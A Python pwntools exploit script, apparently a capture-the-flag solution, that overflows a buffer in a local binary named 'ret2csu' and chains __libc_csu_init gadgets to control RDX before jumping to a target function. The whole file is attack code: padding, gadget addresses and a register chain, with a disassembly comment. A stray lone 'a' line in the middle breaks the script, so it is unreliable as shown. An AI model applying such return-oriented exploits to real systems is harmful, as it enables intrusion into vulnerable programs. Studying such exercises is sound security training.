from pwn import *

'''
        00400880 4c 89 fa        MOV        RDX,R15
        00400883 4c 89 f6        MOV        RSI,R14
        00400886 44 89 ef        MOV        EDI,R13D
        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         
        
        0040088d 48 83 c3 01     ADD        RBX,0x1
        00400891 48 39 dd        CMP        RBP,RBX
        00400894 75 ea           JNZ        LAB_00400880

        0040089a 5b              POP        RBX
        0040089b 5d              POP        RBP
        0040089c 41 5c           POP        R12
        0040089e 41 5d           POP        R13
        004008a0 41 5e           POP        R14
        004008a2 41 5f           POP        R15
        004008a4 c3              RET
'''

gdbcmds = '''
	b *pwnme+130
	c
	'''
elf = ELF('./ret2csu')
target = process('./ret2csu')
#target = gdb.debug('./ret2csu', gdbscript=gdbcmds)


payload = b""
payload += b"A"*40

payload += p64(0x0040089a) # pop gadget
payload += p64(0x0) # rbx
payload += p64(0x1) # rbp
payload += p64(0x600e48) # r12
payload += p64(0x0) # r13
payload += p64(0x0) # r14
payload += p64(0xdeadcafebabebeef) # r15
a
payload += p64(0x00400880)  # mov, ret
payload += p64(0x0) # junk values so that ret addr is in the right place
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

payload += p64(0x004007b1)

print(len(payload), 0xb0)
target.sendline(payload)
target.interactive()
